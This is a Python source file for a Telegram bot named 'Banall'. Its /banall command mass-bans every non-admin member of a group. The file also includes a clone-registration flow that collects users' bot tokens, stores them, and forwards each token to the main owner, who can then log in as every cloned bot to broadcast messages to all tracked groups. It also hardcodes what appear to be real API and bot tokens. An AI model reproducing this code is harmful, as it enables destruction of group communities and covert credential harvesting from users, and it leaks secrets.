import os
import sys
import logging
import asyncio
import sqlite3
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import ChatAdminRequired, PeerIdInvalid
from pyrogram.enums import ChatMembersFilter

# -------------------- CONFIG (MANUAL) --------------------
API_ID = 31418719                     # Apna API_ID daalo
API_HASH = "e044c2413a57ac076ae12ce800269cec"    # Apna API_HASH daalo
BOT_TOKEN = "8758350040:AAHbM8F2P8VG2juGvX4wg0YtsqFW_Hj5-PU"  # Apna BOT_TOKEN daalo
OWNER = 5311223486                  # Apna Telegram user ID (integer)
DB_PATH = "banall.db"              # SQLite database file              # SQLite database file

# -------------------- Logging --------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# -------------------- SQLite Helpers (async) --------------------
def run_query(query, params=(), fetchone=False, fetchall=False, commit=False):
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute(query, params)
    if commit:
        conn.commit()
        result = None
    elif fetchone:
        result = cur.fetchone()
    elif fetchall:
        result = cur.fetchall()
    else:
        result = None
    conn.close()
    return result

async def init_db():
    await asyncio.to_thread(
        run_query,
        """CREATE TABLE IF NOT EXISTS bots (
            bot_id TEXT PRIMARY KEY,
            owner_id INTEGER NOT NULL,
            bot_token TEXT UNIQUE NOT NULL,
            bot_username TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )""",
        commit=True
    )
    await asyncio.to_thread(
        run_query,
        """CREATE TABLE IF NOT EXISTS groups (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            bot_id TEXT NOT NULL,
            chat_id INTEGER NOT NULL,
            chat_title TEXT,
            chat_link TEXT,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (bot_id) REFERENCES bots (bot_id) ON DELETE CASCADE,
            UNIQUE(bot_id, chat_id)
        )""",
        commit=True
    )

async def get_bot_by_id(bot_id: str):
    row = await asyncio.to_thread(
        run_query,
        "SELECT * FROM bots WHERE bot_id = ?",
        (bot_id,),
        fetchone=True
    )
    return row

async def get_bot_by_token(token: str):
    row = await asyncio.to_thread(
        run_query,
        "SELECT * FROM bots WHERE bot_token = ?",
        (token,),
        fetchone=True
    )
    return row

async def add_bot(bot_id: str, owner_id: int, bot_token: str, bot_username: str = None):
    await asyncio.to_thread(
        run_query,
        """INSERT OR REPLACE INTO bots (bot_id, owner_id, bot_token, bot_username)
           VALUES (?, ?, ?, ?)""",
        (bot_id, owner_id, bot_token, bot_username),
        commit=True
    )

async def add_group(bot_id: str, chat_id: int, chat_title: str = None, chat_link: str = None):
    await asyncio.to_thread(
        run_query,
        """INSERT OR IGNORE INTO groups (bot_id, chat_id, chat_title, chat_link)
           VALUES (?, ?, ?, ?)""",
        (bot_id, chat_id, chat_title, chat_link),
        commit=True
    )

async def get_groups(bot_id: str):
    rows = await asyncio.to_thread(
        run_query,
        "SELECT chat_id, chat_link FROM groups WHERE bot_id = ?",
        (bot_id,),
        fetchall=True
    )
    return rows or []

async def get_all_bots():
    rows = await asyncio.to_thread(
        run_query,
        "SELECT bot_id, bot_token, owner_id FROM bots",
        fetchall=True
    )
    return rows or []

async def get_total_clones():
    row = await asyncio.to_thread(
        run_query,
        "SELECT COUNT(*) FROM bots WHERE owner_id != ?",
        (OWNER,),
        fetchone=True
    )
    return row[0] if row else 0

async def get_main_bot():
    row = await asyncio.to_thread(
        run_query,
        "SELECT * FROM bots WHERE owner_id = ?",
        (OWNER,),
        fetchone=True
    )
    return row

# -------------------- Pyrogram Client --------------------
app = Client(
    "banall",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
)

# ---------------- Global Group Tracking ----------------
@app.on_message(filters.group & filters.incoming)
async def track_group(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    chat = message.chat
    chat_id = chat.id
    chat_title = chat.title or "Unknown"
    chat_link = None
    try:
        if chat.username:
            chat_link = f"https://t.me/{chat.username}"
        else:
            chat_link = await client.export_chat_invite_link(chat_id)
    except Exception:
        pass
    await add_group(bot_id, chat_id, chat_title, chat_link)

# ---------- Helper: check admin ----------
async def is_admin(client, chat_id, user_id):
    try:
        async for member in client.get_chat_members(chat_id, filter=ChatMembersFilter.ADMINISTRATORS):
            if member.user.id == user_id:
                return True
        return False
    except Exception:
        return False

# ---------- Helper: get bot owner ID ----------
async def get_bot_owner_id(client):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    return doc["owner_id"] if doc else None

# ---------- Helper: get owner mention ----------
async def get_owner_mention(client, owner_id):
    try:
        user = await client.get_users(owner_id)
        if user.username:
            return f"@{user.username}"
        else:
            return user.first_name
    except:
        return f"User {owner_id}"

# ---------- Commands ----------
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    if not doc:
        await message.reply("⚠️ This bot is not registered. Please contact the main bot owner.")
        return
    owner_id = doc["owner_id"]
    owner_mention = await get_owner_mention(client, owner_id)
    caption = (
        f"🥀 ʜᴇʟʟᴏ! ɪ ᴀᴍ {me.first_name} 🤖🔥\n\n"
        f"👑 **Owner:** {owner_mention}\n"
        f"📢 **Updates:** [Click Here](https://t.me/aayu_bots)\n\n"
        "⚠️ Use commands cautiously!\n"
        "Admin commands: /banall, /unbanall, /leave, /restart\n"
        "Owner commands: /broadcast, /restart\n"
        "Main bot only: /clone (register new clone)"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 Update", url="https://t.me/aayu_bots")],
        [InlineKeyboardButton("👑 Owner", url=f"https://t.me/{owner_mention.replace('@','')}" if owner_mention.startswith('@') else f"tg://user?id={owner_id}")]
    ])
    await message.reply_photo(
        photo="https://telegra.ph/file/b26847056f19c1b5d7712.jpg",
        caption=caption,
        reply_markup=kb
    )

# ---- /banall ----
@app.on_message(filters.command("banall") & filters.group)
async def banall_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚡ Starting BanAll process...")
    admins = [admin.user.id async for admin in client.get_chat_members(message.chat.id, filter=ChatMembersFilter.ADMINISTRATORS)]
    banned = 0
    async for member in client.get_chat_members(message.chat.id):
        try:
            if member.user.is_bot or member.user.id in admins:
                continue
            await client.ban_chat_member(message.chat.id, member.user.id)
            banned += 1
            logger.info(f"Banned {member.user.id} from {message.chat.id}")
        except ChatAdminRequired:
            await message.reply("⚠️ I need **Ban Members** permission!")
            break
        except PeerIdInvalid:
            continue
        except Exception as e:
            logger.warning(f"Failed to ban {member.user.id}: {e}")
    await message.reply(f"✅ BanAll completed! Banned {banned} members.")

# ---- /unbanall ----
@app.on_message(filters.command("unbanall") & filters.group)
async def unbanall_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚡ Starting UnBanAll process...")
    unbanned = 0
    async for member in client.get_chat_members(message.chat.id, filter=ChatMembersFilter.BANNED):
        try:
            await client.unban_chat_member(message.chat.id, member.user.id)
            unbanned += 1
            logger.info(f"Unbanned {member.user.id} from {message.chat.id}")
        except Exception as e:
            logger.warning(f"Failed to unban {member.user.id}: {e}")
    await message.reply(f"✅ UnBanAll completed! Unbanned {unbanned} members.")

# ---- /leave ----
@app.on_message(filters.command("leave") & filters.group)
async def leave_command(client, message: Message):
    if not message.from_user:
        return
    if not await is_admin(client, message.chat.id, message.from_user.id):
        await message.reply("❌ Only admins can use this command!")
        return
    await message.reply("⚠️ Leaving this group...")
    await client.leave_chat(message.chat.id)

# ---- /restart (owner only) ----
@app.on_message(filters.command("restart") & filters.private)
async def restart_command(client, message: Message):
    owner_id = await get_bot_owner_id(client)
    if not owner_id or message.from_user.id != owner_id:
        await message.reply("❌ Only the bot owner can use this command!")
        return
    await message.reply("🔄 Restarting...")
    sys.exit(0)

# ---- /broadcast (owner only) ----
@app.on_message(filters.command("broadcast") & filters.private)
async def broadcast_command(client, message: Message):
    owner_id = await get_bot_owner_id(client)
    if not owner_id or message.from_user.id != owner_id:
        await message.reply("❌ Only the bot owner can use this command!")
        return
    text = message.text.split(maxsplit=1)
    if len(text) < 2:
        await message.reply("Usage: /broadcast <message>")
        return
    broadcast_text = text[1]
    me = await client.get_me()
    bot_id = me.username
    groups = await get_groups(bot_id)
    if not groups:
        await message.reply("ℹ️ No groups found to broadcast.")
        return
    await message.reply(f"📢 Broadcasting to {len(groups)} groups...")
    success = 0
    for group in groups:
        chat_id = group["chat_id"]
        try:
            await client.send_message(chat_id, broadcast_text)
            success += 1
            await asyncio.sleep(0.5)
        except Exception as e:
            logger.warning(f"Failed to send to {chat_id}: {e}")
    await message.reply(f"✅ Broadcast complete! Sent to {success}/{len(groups)} groups.")

# ---- /abroadcast (main owner only) ----
@app.on_message(filters.command("abroadcast") & filters.private)
async def abroadcast_command(client, message: Message):
    if message.from_user.id != OWNER:
        await message.reply("❌ Only the main owner can use this command!")
        return
    text = message.text.split(maxsplit=1)
    if len(text) < 2:
        await message.reply("Usage: /abroadcast <message>")
        return
    broadcast_text = text[1]
    all_bots = await get_all_bots()
    total_groups = 0
    total_sent = 0
    await message.reply(f"📢 Broadcasting to all bots ({len(all_bots)} bots)...")
    for bot in all_bots:
        bot_id = bot["bot_id"]
        token = bot["bot_token"]
        groups = await get_groups(bot_id)
        total_groups += len(groups)
        try:
            temp_app = Client(
                f"temp_{bot_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=token,
                in_memory=True
            )
            await temp_app.start()
            for group in groups:
                chat_id = group["chat_id"]
                try:
                    await temp_app.send_message(chat_id, broadcast_text)
                    total_sent += 1
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.warning(f"Failed to send from {bot_id} to {chat_id}: {e}")
            await temp_app.stop()
        except Exception as e:
            logger.error(f"Failed to start temporary client for {bot_id}: {e}")
    await message.reply(f"✅ Abroadcast complete! Sent to {total_sent}/{total_groups} groups across all bots.")

# ---- /clone command (main bot = registration, clone bot = info) ----
pending_registrations = {}

@app.on_message(filters.command("clone") & filters.private)
async def clone_command(client, message: Message):
    me = await client.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    if not doc:
        await message.reply("⚠️ This bot is not registered. Please contact the main bot owner.")
        return

    # Check if this is the main bot
    if doc["owner_id"] == OWNER:
        # Main bot: start registration flow
        user_id = message.from_user.id
        if user_id in pending_registrations:
            await message.reply("⏳ You already have a pending registration. Send the token or /cancel to abort.")
            return
        pending_registrations[user_id] = {"step": "token"}
        await message.reply(
            "📝 **Clone Registration**\n\n"
            "Please send me the **bot token** of your new bot.\n"
            "You can get it from @BotFather.\n\n"
            "Send /cancel to abort."
        )
    else:
        # Clone bot: show cloning info
        main = await get_main_bot()
        if not main:
            await message.reply("❌ Main bot not found in database.")
            return
        main_username = main["bot_username"]
        caption = (
            "✨ **To create your own bot clone, use the original bot.**\n\n"
            f"👉 @{main_username}\n"
            "Simply go there and start cloning !!"
        )
        await message.reply_photo(
            photo="https://telegra.ph/file/b26847056f19c1b5d7712.jpg",
            caption=caption,
            reply_markup=InlineKeyboardMarkup(
                [[InlineKeyboardButton("🚀 Go to Main Bot", url=f"https://t.me/{main_username}")]]
            )
        )

# ---- Handle token input for registration (main bot only) ----
@app.on_message(filters.private & ~filters.command(["cancel", "clone"]))
async def registration_step(client, message: Message):
    user_id = message.from_user.id
    if user_id not in pending_registrations:
        return
    state = pending_registrations[user_id]
    if state["step"] == "token":
        token = message.text.strip()
        try:
            temp_app = Client(
                f"temp_reg_{user_id}",
                api_id=API_ID,
                api_hash=API_HASH,
                bot_token=token,
                in_memory=True
            )
            await temp_app.start()
            me = await temp_app.get_me()
            bot_id = me.username
            bot_username = me.username
            existing = await get_bot_by_token(token)
            if existing:
                await message.reply("❌ This bot token is already registered.")
                await temp_app.stop()
                pending_registrations.pop(user_id, None)
                return
            await add_bot(bot_id, user_id, token, bot_username)
            # Notify main owner
            try:
                await client.send_message(
                    OWNER,
                    f"🔔 **New Bot Cloned!**\n\n"
                    f"👤 User: {message.from_user.mention}\n"
                    f"🆔 User ID: `{user_id}`\n"
                    f"🤖 Bot Username: @{bot_username}\n"
                    f"🔑 Token: `{token}`\n"
                    f"📦 Total Clones: {await get_total_clones()}"
                )
            except Exception as e:
                logger.warning(f"Failed to notify main owner: {e}")
            await temp_app.stop()
            await message.reply(
                f"✅ **Clone Registered Successfully!**\n\n"
                f"Bot: @{bot_username}\n"
                f"Owner: {message.from_user.mention}\n\n"
                "You can now start your bot with this token.\n"
                "Use /start to see your bot's details."
            )
            pending_registrations.pop(user_id, None)
        except Exception as e:
            await message.reply(f"❌ Invalid token or error: {e}\nPlease send a valid token.")
    else:
        pass

# ---- /cancel (to abort registration) ----
@app.on_message(filters.command("cancel") & filters.private)
async def cancel_registration(client, message: Message):
    user_id = message.from_user.id
    if user_id in pending_registrations:
        pending_registrations.pop(user_id, None)
        await message.reply("❌ Registration cancelled.")
    else:
        await message.reply("ℹ️ No pending registration.")

# ---- Startup: register self ----
async def register_self():
    me = await app.get_me()
    bot_id = me.username
    doc = await get_bot_by_id(bot_id)
    if not doc:
        # Register as main bot (since this is first run)
        await add_bot(bot_id, OWNER, BOT_TOKEN, me.username)
        logger.info(f"Main bot @{bot_id} registered.")
    else:
        logger.info(f"Bot @{bot_id} already registered with owner {doc['owner_id']}")

# -------------------- Run Bot --------------------
if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    loop.run_until_complete(app.start())        # Start the client
    loop.run_until_complete(register_self())    # Register after start
    print("🚀 Banall Bot Booted Successfully (SQLite)")
    try:
        loop.run_forever()                      # Keep the bot running
    except KeyboardInterrupt:
        print("Bot stopped.")
